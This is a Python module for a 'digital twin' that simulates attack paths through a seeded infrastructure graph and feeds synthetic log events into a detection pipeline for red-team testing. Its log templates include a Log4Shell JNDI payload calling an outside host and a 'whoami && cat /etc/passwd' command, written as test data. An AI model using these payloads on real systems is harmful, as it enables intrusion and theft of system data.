"""
agents/digital_twin.py
A14: Digital Twin Lite — HCI-OS

NetworkX-based attack simulation on the 30-node seeded infrastructure graph.
"Simulate Attack" propagates compromise along highest-weight edges and feeds
synthetic Evidence through the REAL pipeline (investigation_loop.run_investigation).

This is NOT live topology discovery — it is explicitly labeled as simulation
for red-team testing and demo purposes.

Gap Fixes:
  #2  Synthetic log format: explicit schema matching A1/A2 input format.
  #6  Feed synthetic logs through investigation_loop.run_investigation().
  #9  Generate timestamped timeline events per hop.
"""

from __future__ import annotations

import json
import logging
import time
import uuid
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import networkx as nx

logger = logging.getLogger("A14_DigitalTwin")
logging.basicConfig(level=logging.INFO)

_DATA = Path(__file__).resolve().parent.parent / "data"
_GRAPH_PATH = _DATA / "asset_graph.json"


# ── Synthetic Log Templates (Gap #2) ──────────────────────────────────────────

_ATTACK_TEMPLATES: Dict[str, Dict[str, Any]] = {
    "web_server": {
        "event_type": "web_access_log",
        "method": "GET",
        "path": "/api/admin/users",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/109.0",
        "status": 200,
        "payload": "${jndi:ldap://185.23.147.82:1389/a}",
        "description": "Log4Shell exploitation attempt on web server",
    },
    "app_server": {
        "event_type": "application_log",
        "method": "POST",
        "path": "/internal/exec",
        "command": "whoami && cat /etc/passwd",
        "description": "Lateral movement — command execution on app server",
    },
    "auth_server": {
        "event_type": "auth_log",
        "method": "LDAP_BIND",
        "path": "/cn=admin,dc=cbse,dc=gov,dc=in",
        "description": "Suspicious LDAP bind with elevated privileges",
    },
    "database": {
        "event_type": "db_access_log",
        "method": "SELECT",
        "path": "student_records.exam_results",
        "query": "SELECT * FROM exam_results WHERE year=2026",
        "rows_returned": 15000,
        "description": "Mass data extraction from student records database",
    },
    "crown_jewel": {
        "event_type": "db_access_log",
        "method": "SELECT",
        "path": "crown_jewel.exam_answer_keys",
        "query": "SELECT * FROM answer_keys WHERE exam_id='JEE_2026'",
        "rows_returned": 50000,
        "description": "Crown jewel access — exam answer key exfiltration",
    },
    "scada_controller": {
        "event_type": "ot_scada_log",
        "protocol": "Modbus",
        "function_code": 5,
        "register": "coil_0x0001",
        "description": "Unauthorized SCADA write command to coil register",
    },
    "default": {
        "event_type": "generic_log",
        "method": "TCP_CONNECT",
        "path": "/",
        "description": "Suspicious network connection during lateral movement",
    },
}


# ── Digital Twin Class ─────────────────────────────────────────────────────────

class DigitalTwin:
    """
    Cyber Resilience Digital Twin — simulation for red-team testing.

    Builds a NetworkX graph from the seeded asset_graph.json and simulates
    APT attack progression along highest-weight edges.
    """

    def __init__(self, graph_path: Optional[Path] = None):
        self.graph_path = graph_path or _GRAPH_PATH
        self.graph: nx.DiGraph = nx.DiGraph()
        self.node_meta: Dict[str, Dict] = {}
        self._load_graph()

    def _load_graph(self) -> None:
        """Load the seeded graph into NetworkX."""
        try:
            with open(self.graph_path, encoding="utf-8") as f:
                raw = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as exc:
            logger.error("A14: Failed to load graph (%s)", exc)
            return

        for node in raw.get("nodes", []):
            nid = node["id"]
            self.graph.add_node(
                nid,
                type=node.get("type", "unknown"),
                criticality=float(node.get("criticality", 0.5)),
                label=node.get("label", nid),
            )
            self.node_meta[nid] = node

        for edge in raw.get("edges", []):
            self.graph.add_edge(
                edge["from"],
                edge["to"],
                weight=float(edge.get("weight", 0.5)),
                protocol=edge.get("protocol", "TCP"),
                relationship=edge.get("relationship", "network"),
            )

        logger.info(
            "A14: Loaded graph — %d nodes, %d edges",
            self.graph.number_of_nodes(),
            self.graph.number_of_edges(),
        )

    def simulate_attack(
        self,
        start_node: str = "CBSE-WebSvr-01",
        target_node: str = "CrownJewel-ExamDB",
        max_hops: int = 10,
        attacker_ip: str = "185.23.147.82",
        feed_pipeline: bool = True,
    ) -> Dict[str, Any]:
        """
        Simulate APT progression through the graph.

        Gap #6: Feeds synthetic logs through investigation_loop.run_investigation().
        Gap #9: Generates timestamped timeline events per hop.
        Gap #2: Uses explicit synthetic log schema per node type.

        Args:
            start_node:     Entry point (default: CBSE-WebSvr-01).
            target_node:    Final target (default: CrownJewel-ExamDB).
            max_hops:       Maximum number of hops before stopping.
            attacker_ip:    Simulated attacker IP address.
            feed_pipeline:  If True, feed each hop through the real pipeline.

        Returns:
            Dict with attack_path, timeline, node_states, pipeline_results.
        """
        path: List[str] = [start_node]
        current = start_node
        visited = {start_node}

        # Follow highest-weight edges
        while current != target_node and len(path) < max_hops:
            neighbors = list(self.graph.successors(current))
            # Filter out already-visited nodes to prevent cycles
            unvisited = [n for n in neighbors if n not in visited]
            if not unvisited:
                # Try all neighbors if we've visited them all
                if not neighbors:
                    break
                unvisited = neighbors

            next_node = max(
                unvisited,
                key=lambda n: self.graph[current][n].get("weight", 0),
            )
            path.append(next_node)
            visited.add(next_node)
            current = next_node

        # Generate timeline events (Gap #9)
        base_time = datetime.now(timezone.utc)
        timeline: List[Dict[str, Any]] = []
        synthetic_events: List[Dict[str, Any]] = []
        pipeline_results: List[Dict[str, Any]] = []

        for hop_idx, node_id in enumerate(path):
            hop_time = base_time + timedelta(seconds=hop_idx * 15)
            node_type = self.graph.nodes[node_id].get("type", "default")

            # Build synthetic raw log event (Gap #2)
            template = _ATTACK_TEMPLATES.get(node_type, _ATTACK_TEMPLATES["default"])
            synthetic_event = self._build_synthetic_event(
                node_id=node_id,
                node_type=node_type,
                template=template,
                attacker_ip=attacker_ip,
                hop_time=hop_time,
                hop_index=hop_idx,
                prev_node=path[hop_idx - 1] if hop_idx > 0 else None,
            )
            synthetic_events.append(synthetic_event)

            # Timeline entry (Gap #9)
            edge_info = ""
            if hop_idx > 0:
                prev = path[hop_idx - 1]
                if self.graph.has_edge(prev, node_id):
                    edge_data = self.graph[prev][node_id]
                    edge_info = f" via {edge_data.get('protocol', 'TCP')} (weight={edge_data.get('weight', 0):.2f})"

            timeline.append({
                "hop": hop_idx,
                "timestamp": hop_time.isoformat() + "Z",
                "node": node_id,
                "node_type": node_type,
                "description": template.get("description", "Lateral movement"),
                "edge_info": edge_info,
                "status": "compromised",
            })

        # Gap #6: Feed through real pipeline
        if feed_pipeline:
            pipeline_results = self._feed_pipeline(synthetic_events, path)

        # Node states (color-coded)
        node_states = self.render_path(path)

        result = {
            "attack_path": path,
            "timeline": timeline,
            "node_states": node_states,
            "pipeline_results": pipeline_results,
            "total_hops": len(path),
            "reached_target": target_node in path,
            "simulation_id": f"SIM-{uuid.uuid4().hex[:8].upper()}",
            "started_at": base_time.isoformat() + "Z",
            "attacker_ip": attacker_ip,
        }

        logger.info(
            "A14: Attack simulation %s → %s (%d hops, reached=%s)",
            start_node, target_node, len(path), target_node in path,
        )
        return result

    def _build_synthetic_event(
        self,
        node_id: str,
        node_type: str,
        template: Dict[str, Any],
        attacker_ip: str,
        hop_time: datetime,
        hop_index: int,
        prev_node: Optional[str],
    ) -> Dict[str, Any]:
        """
        Gap #2: Build a synthetic raw log event matching A1/A2 input format.

        The event has all the fields A1 expects so it goes through
        the real pipeline without schema errors.
        """
        event = {
            "timestamp": hop_time.isoformat() + "Z",
            "source": "digital_twin_simulation",
            "asset_id": node_id,
            "src_ip": attacker_ip,
            "dst_ip": self.node_meta.get(node_id, {}).get("ip", "10.0.0.1") if isinstance(self.node_meta.get(node_id), dict) else "10.0.0.1",
            "event_type": template.get("event_type", "generic_log"),
            "method": template.get("method", "TCP_CONNECT"),
            "path": template.get("path", "/"),
            "description": template.get("description", "Simulated attack event"),
            "simulation": True,
            "hop_index": hop_index,
            "severity": "HIGH" if hop_index > 0 else "MEDIUM",
        }

        # Add template-specific fields
        for key in ["payload", "command", "query", "rows_returned",
                     "protocol", "function_code", "register", "user_agent", "status"]:
            if key in template:
                event[key] = template[key]

        # Add lateral movement context if not the first hop
        if prev_node:
            event["lateral_from"] = prev_node
            event["attack_stage"] = f"hop_{hop_index}"

        return event

    def _feed_pipeline(
        self,
        synthetic_events: List[Dict],
        path: List[str],
    ) -> List[Dict[str, Any]]:
        """
        Gap #6: Feed each synthetic event through the real pipeline.

        Returns list of pipeline results (one per hop).
        """
        results = []
        try:
            from pipeline.investigation_loop import run_investigation
        except ImportError:
            logger.warning("A14: investigation_loop not available — skipping pipeline feed")
            return [{"error": "investigation_loop not available"} for _ in synthetic_events]

        for i, event in enumerate(synthetic_events):
            try:
                result = run_investigation(
                    raw_event=event,
                    asset_id=path[i],
                    source="digital_twin_simulation",
                )
                results.append(result)
                logger.info(
                    "A14: Pipeline hop %d/%d — %s → trust=%.2f anomaly=%.2f",
                    i + 1, len(synthetic_events), path[i],
                    result.get("trust_score", 0),
                    result.get("anomaly_score", 0) or 0,
                )
            except Exception as exc:
                logger.warning("A14: Pipeline failed for hop %d (%s)", i, exc)
                results.append({"error": str(exc), "hop": i, "node": path[i]})

        return results

    def render_path(self, path: List[str]) -> Dict[str, Dict[str, str]]:
        """
        Return node states for UI rendering.

        Color coding: green (clean) → orange (suspicious) → red (compromised).
        """
        states = {}
        path_set = set(path)

        for node_id in self.graph.nodes:
            if node_id in path_set:
                idx = path.index(node_id)
                if idx == 0:
                    status = "entry_point"
                    color = "#e67e22"  # orange
                elif node_id == path[-1]:
                    status = "target_reached"
                    color = "#c0392b"  # dark red
                else:
                    status = "compromised"
                    color = "#e74c3c"  # red
            else:
                # Check if adjacent to a compromised node
                adjacent_compromised = any(
                    n in path_set for n in self.graph.predecessors(node_id)
                ) or any(
                    n in path_set for n in self.graph.successors(node_id)
                )
                if adjacent_compromised:
                    status = "at_risk"
                    color = "#f39c12"  # amber
                else:
                    status = "clean"
                    color = "#2ecc71"  # green

            states[node_id] = {
                "status": status,
                "color": color,
                "criticality": float(self.graph.nodes[node_id].get("criticality", 0.5)),
            }

        return states

    def get_cytoscape_elements(
        self,
        attack_path: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """Export the graph as Cytoscape.js-compatible JSON for the UI."""
        node_states = self.render_path(attack_path or [])
        elements = []

        for node_id, data in self.graph.nodes(data=True):
            state = node_states.get(node_id, {"status": "clean", "color": "#2ecc71"})
            elements.append({
                "group": "nodes",
                "data": {
                    "id": node_id,
                    "label": data.get("label", node_id),
                    "type": data.get("type", "unknown"),
                    "criticality": data.get("criticality", 0.5),
                    "status": state["status"],
                    "color": state["color"],
                },
            })

        for src, dst, data in self.graph.edges(data=True):
            in_path = False
            if attack_path:
                for i in range(len(attack_path) - 1):
                    if attack_path[i] == src and attack_path[i + 1] == dst:
                        in_path = True
                        break

            elements.append({
                "group": "edges",
                "data": {
                    "id": f"{src}->{dst}",
                    "source": src,
                    "target": dst,
                    "weight": data.get("weight", 0.5),
                    "protocol": data.get("protocol", "TCP"),
                    "in_attack_path": in_path,
                    "style": "solid" if in_path else "dotted",
                    "color": "#e74c3c" if in_path else "#bdc3c7",
                },
            })

        return {
            "elements": elements,
            "metadata": {
                "node_count": self.graph.number_of_nodes(),
                "edge_count": self.graph.number_of_edges(),
                "attack_path": attack_path or [],
            },
        }

    def simulate_gnn_guided(
        self,
        start_node: str = "CBSE-WebSvr-01",
        target_node: str = "CrownJewel-ExamDB",
        max_hops: int = 10,
        attacker_ip: str = "185.23.147.82",
    ) -> Dict[str, Any]:
        """
        Gap #8: GNN-guided attack simulation.

        Instead of following purely the highest-weight edges, this simulation
        uses GNN fused scores to select the most likely next hop per step.
        GNN attention weights (GAT) are blended with edge weights and node
        criticality for a richer, model-driven path selection.
        """
        # Fetch GNN predictions
        gnn_preds: Dict[str, Any] = {}
        fused_scores: Dict[str, float] = {}
        try:
            from agents.a5_gnn import get_gnn_predictions
            gnn_preds   = get_gnn_predictions(start_node)
            fused_scores = gnn_preds.get("fused_scores", {})
        except Exception as exc:
            logger.warning("A14: GNN predictions unavailable (%s) — falling back to weight-only", exc)

        path: List[str] = [start_node]
        current = start_node
        visited = {start_node}

        while current != target_node and len(path) < max_hops:
            neighbors = [n for n in self.graph.successors(current) if n not in visited]
            if not neighbors:
                neighbors = list(self.graph.successors(current))
            if not neighbors:
                break

            def _gnn_score(n: str) -> float:
                edge_w  = self.graph[current][n].get("weight", 0.5)
                fs      = fused_scores.get(n, 0.0)
                crit    = self.graph.nodes[n].get("criticality", 0.5)
                return 0.4 * edge_w + 0.4 * fs + 0.2 * crit

            next_node = max(neighbors, key=_gnn_score)
            path.append(next_node)
            visited.add(next_node)
            current = next_node

        base_time = datetime.now(timezone.utc)
        timeline = []
        for hop_idx, node_id in enumerate(path):
            hop_time  = base_time + timedelta(seconds=hop_idx * 15)
            node_type = self.graph.nodes[node_id].get("type", "default")
            template  = _ATTACK_TEMPLATES.get(node_type, _ATTACK_TEMPLATES["default"])
            timeline.append({
                "hop": hop_idx,
                "timestamp": hop_time.isoformat() + "Z",
                "node": node_id,
                "node_type": node_type,
                "gnn_fused_score": round(fused_scores.get(node_id, 0.0), 4),
                "description": template.get("description", "GNN-guided lateral movement"),
                "status": "compromised",
            })

        logger.info(
            "A14 GNN-guided: %s → %s (%d hops, reached=%s)",
            start_node, target_node, len(path), target_node in path,
        )

        return {
            "mode": "gnn_guided",
            "attack_path": path,
            "timeline": timeline,
            "node_states": self.render_path(path),
            "gnn_fused_scores": {n: round(fused_scores.get(n, 0.0), 4) for n in path},
            "simulation_id": f"SIM-GNN-{uuid.uuid4().hex[:8].upper()}",
            "started_at": base_time.isoformat() + "Z",
            "reached_target": target_node in path,
            "attacker_ip": attacker_ip,
        }
